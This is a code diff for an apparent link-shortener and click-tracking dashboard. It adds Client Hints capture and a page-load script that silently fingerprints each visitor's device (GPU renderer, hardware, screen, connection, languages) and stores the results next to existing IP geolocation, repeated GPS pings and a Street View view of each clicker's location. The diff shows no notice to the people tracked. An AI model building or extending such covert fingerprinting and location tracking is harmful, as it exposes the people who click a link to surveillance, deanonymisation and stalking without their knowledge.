@@ -34,13 +34,16 @@ async function main() {
     next(err);
   });
 
-  // Security headers
+  // Security + Client Hints headers
   app.use((req, res, next) => {
+    // Request Client Hints from Chromium browsers
+    res.setHeader("Accept-CH", "Sec-CH-UA, Sec-CH-UA-Mobile, Sec-CH-UA-Platform, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Model, Sec-CH-UA-Arch, Sec-CH-UA-Bitness, Sec-CH-UA-WoW64");
+    res.setHeader("Critical-CH", "Sec-CH-UA, Sec-CH-UA-Platform, Sec-CH-UA-Platform-Version, Sec-CH-UA-Model");
     res.setHeader("X-Content-Type-Options", "nosniff");
     res.setHeader("X-Frame-Options", "SAMEORIGIN");
     res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
     res.setHeader("Permissions-Policy", "camera=(), microphone=(), geolocation=(), payment=()");
-    res.setHeader("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; frame-src https://www.google.com; connect-src 'self'; font-src 'self'");
+    res.setHeader("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; frame-src https://www.google.com https://www.openstreetmap.org; connect-src 'self'; font-src 'self'");
     if (req.secure || req.headers["x-forwarded-proto"] === "https") res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
     res.removeHeader("X-Powered-By");
     next();
@@ -114,6 +117,37 @@ async function main() {
     } catch (e) { console.error("geo lookup error:", e.message); }
     if (fetchTimeout) clearTimeout(fetchTimeout);
     return { country: null, region: null, city: null, lat: null, lon: null, isp: null };
+  }
+
+  function parseUA(ua) {
+    if (!ua) return { browser: null, os: null, deviceType: 'desktop' };
+    let browser = null, os = null, deviceType = 'desktop';
+    // Browser
+    if (/Edg\//.test(ua)) browser = 'Edge ' + (ua.match(/Edg\/([\d.]+)/) || [])[1];
+    else if (/OPR\//.test(ua)) browser = 'Opera ' + (ua.match(/OPR\/([\d.]+)/) || [])[1];
+    else if (/Firefox\//.test(ua)) browser = 'Firefox ' + (ua.match(/Firefox\/([\d.]+)/) || [])[1];
+    else if (/Trident/.test(ua)) browser = 'IE ' + (ua.match(/rv:([\d.]+)/) || [])[1];
+    else if (/Chrome\//.test(ua) && !/Chromium/.test(ua)) browser = 'Chrome ' + (ua.match(/Chrome\/([\d.]+)/) || [])[1];
+    else if (/Chromium\//.test(ua)) browser = 'Chromium ' + (ua.match(/Chromium\/([\d.]+)/) || [])[1];
+    else if (/Safari\//.test(ua) && /Version\//.test(ua)) browser = 'Safari ' + (ua.match(/Version\/([\d.]+)/) || [])[1];
+    else if (/CriOS\//.test(ua)) browser = 'Chrome iOS ' + (ua.match(/CriOS\/([\d.]+)/) || [])[1];
+    else if (/FxiOS\//.test(ua)) browser = 'Firefox iOS ' + (ua.match(/FxiOS\/([\d.]+)/) || [])[1];
+    // OS
+    const androidVer = ua.match(/Android\s([\d.]+)/);
+    const iosVer = ua.match(/OS\s([\d_]+)/);
+    const winVer = ua.match(/Windows NT\s([\d.]+)/);
+    const macVer = ua.match(/Mac OS X\s([\d_.]+)/);
+    if (androidVer) { os = 'Android ' + androidVer[1]; deviceType = 'mobile'; }
+    else if (/iPhone/.test(ua)) { os = 'iOS ' + (iosVer ? iosVer[1].replace(/_/g, '.') : ''); deviceType = 'mobile'; }
+    else if (/iPad/.test(ua)) { os = 'iOS ' + (iosVer ? iosVer[1].replace(/_/g, '.') : ''); deviceType = 'tablet'; }
+    else if (/iPod/.test(ua)) { os = 'iOS ' + (iosVer ? iosVer[1].replace(/_/g, '.') : ''); deviceType = 'mobile'; }
+    else if (winVer) { os = 'Windows ' + ({ '10.0':'10/11', '6.3':'8.1', '6.2':'8', '6.1':'7', '6.0':'Vista', '5.1':'XP' }[winVer[1]] || winVer[1]); }
+    else if (macVer) os = 'macOS ' + macVer[1].replace(/_/g, '.');
+    else if (/CrOS/.test(ua)) os = 'ChromeOS';
+    else if (/Linux/.test(ua)) { os = 'Linux'; if (/Android/.test(ua)) deviceType = 'mobile'; }
+    // Tablet heuristics
+    if (deviceType === 'mobile' && /iPad|tablet|Tab\s|PlayBook|Kindle|Silk/i.test(ua)) deviceType = 'tablet';
+    return { browser, os, deviceType };
   }
 
   function baseUrl(req) {
@@ -282,6 +316,79 @@ async function main() {
     const referrer = req.headers.referer || null;
     const ua = req.headers["user-agent"] || null;
 
+    // ─── Client Hints from request headers ───────────
+    const chUa          = req.headers["sec-ch-ua"] || null;
+    const chUaMobile    = req.headers["sec-ch-ua-mobile"] || null;
+    const chPlatform    = req.headers["sec-ch-ua-platform"] || null;
+    const chPlatformVer = req.headers["sec-ch-ua-platform-version"] || null;
+    const chModel       = req.headers["sec-ch-ua-model"] || null;
+    const chArch        = req.headers["sec-ch-ua-arch"] || null;
+    const chBitness     = req.headers["sec-ch-ua-bitness"] || null;
+    const chFullVerList = req.headers["sec-ch-ua-full-version-list"] || null;
+    const chWow64       = req.headers["sec-ch-ua-wow64"] || null;
+
+    // ─── Device info from client-side JS ────────────
+    const clientDevice = req.body.device_info || null;
+
+    // ─── Determine browser, OS, device_type ──────────
+    let browser = null, os = null, deviceType = null;
+
+    // Prefer Client Hints (Chromium browsers)
+    if (chUa) {
+      try {
+        // sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131"
+        const brands = chUa.split(',').map(b => b.trim());
+        for (const b of brands) {
+          const m = b.match(/^"([^"]+)";v="([^"]+)"$/);
+          if (m && !m[1].startsWith('Not') && m[1] !== 'Chromium' && m[1] !== 'Not(A:Brand') {
+            browser = m[1] + ' ' + m[2];
+            break;
+          }
+        }
+        if (!browser && brands.length) {
+          const m = brands[0].match(/^"([^"]+)";v="([^"]+)"$/);
+          if (m) browser = m[1] + ' ' + m[2];
+        }
+      } catch {}
+    }
+    if (chPlatform) {
+      try { os = JSON.parse(chPlatform); } catch { os = chPlatform; }
+      if (chPlatformVer) { try { const v = JSON.parse(chPlatformVer); os += ' ' + v; } catch { os += ' ' + chPlatformVer; } }
+    }
+    if (chUaMobile === '"?1"' || chUaMobile === '?1') deviceType = 'mobile';
+    else if (chUaMobile === '"?0"' || chUaMobile === '?0') deviceType = 'desktop';
+
+    // Fallback: parse User-Agent if Client Hints missing
+    if (!browser || !os || !deviceType) {
+      const parsed = parseUA(ua);
+      if (!browser) browser = parsed.browser;
+      if (!os) os = parsed.os;
+      if (!deviceType) deviceType = parsed.deviceType;
+    }
+
+    // Client-side JS overrides (most accurate for feature detection)
+    if (clientDevice) {
+      if (clientDevice.browser) browser = clientDevice.browser;
+      if (clientDevice.os) os = clientDevice.os;
+      if (clientDevice.deviceType) deviceType = clientDevice.deviceType;
+    }
+
+    // Build device_json blob
+    const deviceJson = {
+      // Client Hints headers
+      ...(chUa ? { sec_ch_ua: chUa } : {}),
+      ...(chUaMobile ? { sec_ch_ua_mobile: chUaMobile } : {}),
+      ...(chPlatform ? { sec_ch_ua_platform: chPlatform } : {}),
+      ...(chPlatformVer ? { sec_ch_ua_platform_version: chPlatformVer } : {}),
+      ...(chModel ? { sec_ch_ua_model: chModel } : {}),
+      ...(chArch ? { sec_ch_ua_arch: chArch } : {}),
+      ...(chBitness ? { sec_ch_ua_bitness: chBitness } : {}),
+      ...(chFullVerList ? { sec_ch_ua_full_version_list: chFullVerList } : {}),
+      ...(chWow64 ? { sec_ch_ua_wow64: chWow64 } : {}),
+      // Client-side feature detection
+      ...(clientDevice || {})
+    };
+
     const geo = await lookupGeo(ip);
     let clickLat = geo.lat, clickLon = geo.lon, clickAcc = null;
     if (lat != null && lon != null && lat >= -90 && lat <= 90 && lon >= -180 && lon <= 180) {
@@ -291,7 +398,8 @@ async function main() {
     const { data: clickRow, error: clickErr } = await supabase.from("clicks").insert({
       link_id: link.id, ip, referrer, user_agent: ua,
       country: geo.country, region: geo.region, city: geo.city,
-      lat: clickLat, lon: clickLon, isp: geo.isp, gps_accuracy: clickAcc
+      lat: clickLat, lon: clickLon, isp: geo.isp, gps_accuracy: clickAcc,
+      browser, os, device_type: deviceType, device_json: Object.keys(deviceJson).length ? deviceJson : null
     }).select("id").single();
     if (clickErr) throw clickErr;
 
@@ -444,7 +552,7 @@ async function main() {
 
   // ─── Dashboard ─────────────────────────────────────────────────
   const DASH_HTML = dashboardHTML();
-  app.get("/", (req, res) => { res.setHeader("Cache-Control", "public, max-age=3600"); res.send(DASH_HTML); });
+  app.get("/", (req, res) => { res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate"); res.setHeader("Pragma", "no-cache"); res.send(DASH_HTML); });
 
   app.use((req, res) => { res.status(404).json({ error: "not found" }); });
 
@@ -485,8 +593,101 @@ let CLICK_ID = null;
 let clickPosted = false;
 let redirected = false;
 
+// ─── Device fingerprint collection ─────────────
+function collectDeviceInfo() {
+  const ua = navigator.userAgent;
+  const info = {};
+  // Browser + version
+  try {
+    if (/Edg\//.test(ua)) info.browser = 'Edge ' + (ua.match(/Edg\/([\d.]+)/)||[])[1];
+    else if (/OPR\//.test(ua)) info.browser = 'Opera ' + (ua.match(/OPR\/([\d.]+)/)||[])[1];
+    else if (/Firefox\//.test(ua)) info.browser = 'Firefox ' + (ua.match(/Firefox\/([\d.]+)/)||[])[1];
+    else if (/CriOS\//.test(ua)) info.browser = 'Chrome iOS ' + (ua.match(/CriOS\/([\d.]+)/)||[])[1];
+    else if (/FxiOS\//.test(ua)) info.browser = 'Firefox iOS ' + (ua.match(/FxiOS\/([\d.]+)/)||[])[1];
+    else if (/Chrome\//.test(ua)) info.browser = 'Chrome ' + (ua.match(/Chrome\/([\d.]+)/)||[])[1];
+    else if (/Safari\//.test(ua) && /Version\//.test(ua)) info.browser = 'Safari ' + (ua.match(/Version\/([\d.]+)/)||[])[1];
+    else if (/Trident/.test(ua)) info.browser = 'IE ' + (ua.match(/rv:([\d.]+)/)||[])[1];
+  } catch(e) {}
+  // OS + version
+  try {
+    const av = ua.match(/Android\s([\d.]+)/);
+    const iv = ua.match(/OS\s([\d_]+)/);
+    const wv = ua.match(/Windows NT\s([\d.]+)/);
+    const mv = ua.match(/Mac OS X\s([\d_.]+)/);
+    if (av) info.os = 'Android ' + av[1];
+    else if (/iPhone/.test(ua)) info.os = 'iOS ' + (iv ? iv[1].replace(/_/g,'.') : '');
+    else if (/iPad/.test(ua)) info.os = 'iPadOS ' + (iv ? iv[1].replace(/_/g,'.') : '');
+    else if (wv) info.os = 'Windows ' + ({'10.0':'10/11','6.3':'8.1','6.2':'8','6.1':'7'}[wv[1]]||wv[1]);
+    else if (mv) info.os = 'macOS ' + mv[1].replace(/_/g,'.');
+    else if (/CrOS/.test(ua)) info.os = 'ChromeOS';
+    else if (/Linux/.test(ua)) info.os = 'Linux';
+  } catch(e) {}
+  // Device type
+  if (/iPad|tablet|Tab\s|PlayBook|Kindle|Silk/i.test(ua)) info.deviceType = 'tablet';
+  else if (/Mobile|iPhone|Android.*Mobile/i.test(ua)) info.deviceType = 'mobile';
+  else info.deviceType = 'desktop';
+  // Screen & viewport
+  info.screen = { w: screen.width, h: screen.height };
+  info.viewport = { w: window.innerWidth, h: window.innerHeight };
+  info.pixelRatio = window.devicePixelRatio || 1;
+  info.colorDepth = screen.colorDepth;
+  // Touch
+  info.touch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+  info.maxTouchPoints = navigator.maxTouchPoints || 0;
+  // Language
+  info.language = navigator.language;
+  if (navigator.languages) info.languages = Array.from(navigator.languages);
+  // Platform (navigator.platform is deprecated but still useful)
+  info.navPlatform = navigator.platform || null;
+  // Cookies
+  info.cookieEnabled = navigator.cookieEnabled;
+  // Online
+  info.onLine = navigator.onLine;
+  // Hardware
+  if (navigator.deviceMemory) info.memory = navigator.deviceMemory;
+  if (navigator.hardwareConcurrency) info.cores = navigator.hardwareConcurrency;
+  // Connection
+  if (navigator.connection) {
+    info.connection = {
+      type: navigator.connection.type || null,
+      effectiveType: navigator.connection.effectiveType || null,
+      downlink: navigator.connection.downlink || null,
+      rtt: navigator.connection.rtt || null,
+      saveData: navigator.connection.saveData || false
+    };
+  }
+  // WebGL GPU renderer
+  try {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if (gl) {
+      const ext = gl.getExtension('WEBGL_debug_renderer_info');
+      if (ext) info.gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+    }
+  } catch(e) {}
+  // Battery (best effort, async - skip for now, too slow for redirect)
+  // Storage estimate
+  if (navigator.storage && navigator.storage.estimate) {
+    try {
+      // Don't await this - too slow for redirect mode
+      // info.storage = await navigator.storage.estimate();
+    } catch(e) {}
+  }
+  // Media capabilities
+  if (navigator.mediaCapabilities) info.mediaCapabilities = true;
+  // WebRTC support
+  info.webrtc = !!(window.RTCPeerConnection || window.webkitRTCPeerConnection);
+  // PDF viewer
+  info.pdfViewer = navigator.pdfViewerEnabled || null;
+  // Do Not Track
+  info.doNotTrack = navigator.doNotTrack || null;
+  return info;
+}
+const DEVICE_INFO = collectDeviceInfo();
+
 function postClick(data) {
-  const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+  const payload = { ...data, device_info: DEVICE_INFO };
+  const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
   return fetch('/api/click', { method: 'POST', body: blob, keepalive: true })
     .then(r => r.json())
     .then(r => { CLICK_ID = r.click_id || null; return r; })
@@ -544,7 +745,8 @@ let clickPosted = false;
 function postAndRedirect(gpsData) {
   if (!clickPosted) {
     clickPosted = true;
-    const blob = new Blob([JSON.stringify(gpsData ? { slug: SLUG, ...gpsData } : { slug: SLUG })], { type: 'application/json' });
+    const payload = gpsData ? { slug: SLUG, ...gpsData, device_info: DEVICE_INFO } : { slug: SLUG, device_info: DEVICE_INFO };
+    const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
     if (navigator.sendBeacon) { navigator.sendBeacon('/api/click', blob); }
     else { fetch('/api/click', { method: 'POST', body: blob, keepalive: true }).catch(() => {}); }
   }
@@ -664,7 +866,7 @@ function dashboardHTML() {
       <thead><tr><th>Short Link</th><th>Destination</th><th>Label</th><th>Clicks</th><th>Status</th><th>Created</th><th></th></tr></thead>
       <tbody id="linksBody"></tbody>
     </table>
-    <div id="emptyState" class="empty-state" style="display:none;"><div class="icon">\ud83d\udced</div><div>No links yet. Create one above!</div></div>
+    <div id="emptyState" class="empty-state" style="display:block;"><div class="icon">\u23f3</div><div>Loading links...</div></div>
   </div>
 </div>
 <div class="modal-overlay" id="modalOverlay"><div class="modal" id="modalContent"></div></div>
@@ -696,11 +898,12 @@ function fmtDate(d){if(!d)return'\u2014';try{return new Date(d).toLocaleDateStri
 function fmtDT(d){if(!d)return'\u2014';try{return new Date(d).toLocaleString(undefined,{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});}catch{return d;}}
 function flagEmoji(c){if(!c||c==='Local'||c.length!==2)return '\ud83d\udccd';try{const code=c.toUpperCase();let out='';for(let i=0;i<code.length;i++)out+=String.fromCodePoint(127397+code.charCodeAt(i));return out;}catch{return '\ud83c\udf10';}}
 async function loadLinks(){
-  const links=await api('GET','/api/links');
   const tbody=document.getElementById('linksBody');
   const empty=document.getElementById('emptyState');
+  try{
+  const links=await api('GET','/api/links');
   if(links.error){tbody.innerHTML='';empty.style.display='block';empty.textContent='Error: '+links.error;return;}
-  if(!links.length){tbody.innerHTML='';empty.style.display='block';empty.textContent='No links yet. Create one above!';return;}
+  if(!links||!links.length){tbody.innerHTML='';empty.style.display='block';empty.textContent='No links yet. Create one above!';return;}
   empty.style.display='none';
   tbody.innerHTML=links.map(l=>\`<tr>
     <td><span class="slug">/\${esc(l.slug)}</span><br><span class="short-url" data-url="\${location.origin}/\${esc(l.slug)}" onclick="copyUrl(this.dataset.url)">\${location.origin}/\${l.slug}</span></td>
@@ -715,6 +918,7 @@ async function loadLinks(){
       <button class="btn-sm btn-muted" data-slug="\${esc(l.slug)}" onclick="toggleLink(this.dataset.slug)">\${l.active?'Pause':'Resume'}</button>
       <button class="btn-sm btn-danger" data-slug="\${esc(l.slug)}" onclick="deleteLink(this.dataset.slug)">Delete</button>
     </td></tr>\`).join('');
+  }catch(e){tbody.innerHTML='';empty.style.display='block';empty.textContent='loadLinks error: '+e.message;console.error('loadLinks error:',e);}
 }
 document.getElementById('createForm').addEventListener('submit',async e=>{
   e.preventDefault();
@@ -730,13 +934,13 @@ document.getElementById('createForm').addEventListener('submit',async e=>{
 });
 async function toggleLink(s){const r=await api('PATCH','/api/links/'+s+'/toggle');if(r.error)showToast('Error: '+r.error);else loadLinks();}
 async function deleteLink(s){if(!confirm('Delete this link and all click data?'))return;const r=await api('DELETE','/api/links/'+s);if(r.error)showToast('Error: '+r.error);else loadLinks();}
-async function viewDetail(slug){
+let viewDetail_clicks=[];async function viewDetail(slug){
   const data=await api('GET','/api/links/'+slug);
   if(data.error){showToast(data.error);return;}
   const st=data.stats||{};
   const maxDay=Math.max(...(data.by_day||[]).map(d=>d.count),1);
   const dayBars=(data.by_day||[]).slice(0,14).reverse().map(d=>'<div class="bar-row"><span class="bar-label">'+d.day.slice(5)+'</span><div class="bar-fill" style="width:'+(d.count/maxDay*100).toFixed(1)+'%"></div><span class="bar-value">'+d.count+'</span></div>').join('');
-  const cRows=(data.recent_clicks||[]).slice(0,50).map(c=>{const gps=c.gps_accuracy!=null;const hasCoords=c.lat!=null&&c.lon!=null;const locStr=hasCoords?'<a href="#" onclick="showStreetView('+c.lat+','+c.lon+');return false;" style="color:var(--accent);cursor:pointer;text-decoration:none;">'+(gps?'<span style="color:var(--green);">\ud83d\udce1 GPS</span> '+(c.lat.toFixed(4)+', '+c.lon.toFixed(4))+' <span style="color:var(--muted);font-size:0.55rem;">\u00b1'+Math.round(c.gps_accuracy)+'m</span>':flagEmoji(c.country)+' '+(esc(c.city)||'\u2014')+', '+(esc(c.region)||'\u2014')+' <span style="color:var(--muted);font-size:0.6rem;">('+(esc(c.country)||'?')+')</span>')+' \ud83c\udfe0</a>':(gps?'<span style="color:var(--green);">\ud83d\udce1 GPS</span> \u2014':flagEmoji(c.country)+' '+(esc(c.city)||'\u2014')+', '+(esc(c.region)||'\u2014')+' <span style="color:var(--muted);font-size:0.6rem;">('+(esc(c.country)||'?')+')</span>');return '<tr><td>'+fmtDT(c.clicked_at)+'</td><td>'+esc(c.ip)+'</td><td>'+locStr+'</td><td title="'+esc(c.user_agent)+'">'+esc((c.user_agent||'').slice(0,35))+'</td><td title="'+esc(c.referrer)+'">'+(esc((c.referrer||'').slice(0,25))||'Direct')+'</td></tr>';}).join('');
+  const cRows=(data.recent_clicks||[]).slice(0,50).map(c=>{const gps=c.gps_accuracy!=null;const hasCoords=c.lat!=null&&c.lon!=null;const locStr=hasCoords?'<a href="#" onclick="showStreetView('+c.lat+','+c.lon+');return false;" style="color:var(--accent);cursor:pointer;text-decoration:none;">'+(gps?'<span style="color:var(--green);">\ud83d\udce1 GPS</span> '+(c.lat.toFixed(4)+', '+c.lon.toFixed(4))+' <span style="color:var(--muted);font-size:0.55rem;">\u00b1'+Math.round(c.gps_accuracy)+'m</span>':flagEmoji(c.country)+' '+(esc(c.city)||'\u2014')+', '+(esc(c.region)||'\u2014')+' <span style="color:var(--muted);font-size:0.6rem;">('+(esc(c.country)||'?')+')</span>')+' \ud83c\udfe0</a>':(gps?'<span style="color:var(--green);">\ud83d\udce1 GPS</span> \u2014':flagEmoji(c.country)+' '+(esc(c.city)||'\u2014')+', '+(esc(c.region)||'\u2014')+' <span style="color:var(--muted);font-size:0.6rem;">('+(esc(c.country)||'?')+')</span>');const devIcon=c.device_type==='mobile'?'\ud83d\udcf1':c.device_type==='tablet'?'\ud83d\udcf5':'\ud83d\udda5';const devLabel=esc(c.browser||'')||esc((c.user_agent||'').slice(0,25));const devSub=esc(c.os||'');const devTitle=[c.browser,c.os,c.device_type,c.device_json?JSON.stringify(c.device_json).slice(0,200):'',c.user_agent].filter(Boolean).join('\\n');return '<tr><td>'+fmtDT(c.clicked_at)+'</td><td>'+esc(c.ip)+'</td><td>'+locStr+'</td><td title="'+devTitle+'"><span style="cursor:pointer;" onclick="showDeviceInfo('+(c.id||0)+')">'+devIcon+' <strong>'+devLabel+'</strong>'+(devSub?'<br><span style="color:var(--muted);font-size:0.6rem;">'+devSub+'</span>':'')+'</span></td><td title="'+esc(c.referrer)+'">'+(esc((c.referrer||'').slice(0,25))||'Direct')+'</td></tr>';}).join('');
   let countryBars='',cityBars='';
   if(data.by_country&&data.by_country.length){const mx=Math.max(...data.by_country.map(x=>x.count),1);countryBars='<h3 style="font-size:0.8rem;margin:0.75rem 0 0.5rem;">By Country</h3><div class="bar-chart">'+data.by_country.map(d=>'<div class="bar-row"><span class="bar-label">'+flagEmoji(d.country)+' '+esc(d.country)+'</span><div class="bar-fill" style="width:'+(d.count/mx*100).toFixed(1)+'%"></div><span class="bar-value">'+d.count+'</span></div>').join('')+'</div>';}
   if(data.by_city&&data.by_city.length){const mx=Math.max(...data.by_city.map(x=>x.count),1);cityBars='<h3 style="font-size:0.8rem;margin:0.75rem 0 0.5rem;">By City</h3><div class="bar-chart">'+data.by_city.map(d=>'<div class="bar-row"><span class="bar-label">'+esc(d.city)+'</span><div class="bar-fill" style="width:'+(d.count/mx*100).toFixed(1)+'%"></div><span class="bar-value">'+d.count+'</span></div>').join('')+'</div>';}
@@ -767,7 +971,7 @@ async function viewDetail(slug){
     '<div class="form-group" style="flex:0.6;min-width:120px;"><label>Mode</label><select id="editTracking" style="font-size:0.8rem;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);padding:0.4rem 0.6rem;"><option value="redirect"'+(isEmbed?'':' selected')+'>Redirect</option><option value="embed"'+(isEmbed?' selected':'')+'>Embed + GPS</option></select></div>'+
     '<div class="form-group" style="flex:0.4;min-width:80px;"><label>GPS interval (s)</label><input type="number" id="editInterval" value="'+(data.gps_interval||30)+'" min="5" max="3600" style="font-size:0.8rem;padding:0.4rem 0.6rem;"></div>'+
     '<div class="form-group" style="flex:0.4;min-width:80px;"><label>Max pings</label><input type="number" id="editMaxPings" value="'+(data.max_pings||100)+'" min="0" max="10000" style="font-size:0.8rem;padding:0.4rem 0.6rem;"></div>'+
-    '<button class="btn-primary btn-sm" onclick="saveLinkSettings(\''+esc(data.slug)+'\')" style="height:32px;">Save</button>'+
+    '<button class="btn-primary btn-sm" onclick="saveLinkSettings(&apos;'+esc(data.slug)+'&apos;)" style="height:32px;">Save</button>'+
     '</div>';
   document.getElementById('modalContent').innerHTML=
     '<button class="close-btn" onclick="closeModal()">\u2715</button>'+
@@ -798,6 +1002,54 @@ async function saveLinkSettings(slug){
   loadLinks();
 }
 function closeModal(){document.getElementById('modalOverlay').classList.remove('open');}
+function showDeviceInfo(clickId){
+  const clicks=(typeof viewDetail_clicks!== 'undefined')?viewDetail_clicks:[];
+  const c=clicks.find(x=>x.id===clickId);
+  if(!c){showToast('Click data not found');return;}
+  const dj=c.device_json||{};
+  const rows=[];
+  // Core
+  if(c.browser)rows.push(['Browser','<strong>'+esc(c.browser)+'</strong>']);
+  if(c.os)rows.push(['OS',esc(c.os)]);
+  if(c.device_type)rows.push(['Device Type',esc(c.device_type)]);
+  // Client Hints
+  if(dj.sec_ch_ua)rows.push(['Sec-CH-UA',esc(dj.sec_ch_ua)]);
+  if(dj.sec_ch_ua_platform)rows.push(['Platform (CH)',esc(dj.sec_ch_ua_platform)]);
+  if(dj.sec_ch_ua_platform_version)rows.push(['Platform Version (CH)',esc(dj.sec_ch_ua_platform_version)]);
+  if(dj.sec_ch_ua_mobile)rows.push(['Mobile (CH)',esc(dj.sec_ch_ua_mobile)]);
+  if(dj.sec_ch_ua_model)rows.push(['Model (CH)','<strong>'+esc(dj.sec_ch_ua_model)+'</strong>']);
+  if(dj.sec_ch_ua_arch)rows.push(['Arch (CH)',esc(dj.sec_ch_ua_arch)]);
+  if(dj.sec_ch_ua_bitness)rows.push(['Bitness (CH)',esc(dj.sec_ch_ua_bitness)]);
+  if(dj.sec_ch_ua_full_version_list)rows.push(['Full Version List (CH)',esc(dj.sec_ch_ua_full_version_list)]);
+  if(dj.sec_ch_ua_wow64)rows.push(['WoW64 (CH)',esc(dj.sec_ch_ua_wow64)]);
+  // Screen
+  if(dj.screen)rows.push(['Screen',dj.screen.w+'\u00d7'+dj.screen.h]);
+  if(dj.viewport)rows.push(['Viewport',dj.viewport.w+'\u00d7'+dj.viewport.h]);
+  if(dj.pixelRatio)rows.push(['Pixel Ratio',dj.pixelRatio]);
+  if(dj.colorDepth)rows.push(['Color Depth',dj.colorDepth+'-bit']);
+  // Touch
+  if(dj.touch!=null)rows.push(['Touch',dj.touch?'\u2705 Yes ('+dj.maxTouchPoints+' points)':'\u274c No']);
+  // Language
+  if(dj.language)rows.push(['Language',esc(dj.language)+(dj.languages&&dj.languages.length>1?' ('+dj.languages.length+')':'')]);
+  // Hardware
+  if(dj.memory)rows.push(['Memory',dj.memory+' GB']);
+  if(dj.cores)rows.push(['CPU Cores',dj.cores]);
+  if(dj.gpu)rows.push(['GPU',esc(dj.gpu)]);
+  // Connection
+  if(dj.connection)rows.push(['Connection',esc(dj.connection.effectiveType||dj.connection.type||'\u2014')+(dj.connection.downlink?' '+dj.connection.downlink+'Mbps':'')+(dj.connection.rtt?' RTT:'+dj.connection.rtt+'ms':'')+(dj.connection.saveData?' (save)':'')]);
+  // Flags
+  if(dj.onLine!=null)rows.push(['Online',dj.onLine?'\u2705':'\u274c']);
+  if(dj.cookieEnabled!=null)rows.push(['Cookies',dj.cookieEnabled?'\u2705':'\u274c']);
+  if(dj.doNotTrack)rows.push(['Do Not Track',esc(dj.doNotTrack)]);
+  if(dj.webrtc!=null)rows.push(['WebRTC',dj.webrtc?'\u2705':'\u274c']);
+  if(dj.navPlatform)rows.push(['navigator.platform',esc(dj.navPlatform)]);
+  // Full UA
+  if(c.user_agent)rows.push(['User-Agent','<span style="font-size:0.65rem;word-break:break-all;">'+esc(c.user_agent)+'</span>']);
+  const table=rows.map(r=>'<tr><td style="color:var(--muted);font-size:0.7rem;white-space:nowrap;padding-right:1rem;vertical-align:top;">'+r[0]+'</td><td style="font-size:0.75rem;">'+r[1]+'</td></tr>').join('');
+  const devIcon=c.device_type==='mobile'?"\ud83d\udcf1":c.device_type==='tablet'?"\ud83d\udcf5":"\ud83d\udda5";
+  document.getElementById('modalContent').innerHTML='<button class="close-btn" onclick="closeModal()">\u2715</button><h2>'+devIcon+' Device Info</h2><p style="color:var(--muted);font-size:0.75rem;margin-bottom:1rem;">'+esc(c.browser||'Unknown')+' on '+esc(c.os||'Unknown')+'</p><table style="width:100%;border-collapse:collapse;">'+table+'</table>';
+  document.getElementById('modalOverlay').classList.add('open');
+}
 function showStreetView(lat,lon){
   const p=document.getElementById('streetViewPanel');
   const f=document.getElementById('streetViewFrame');
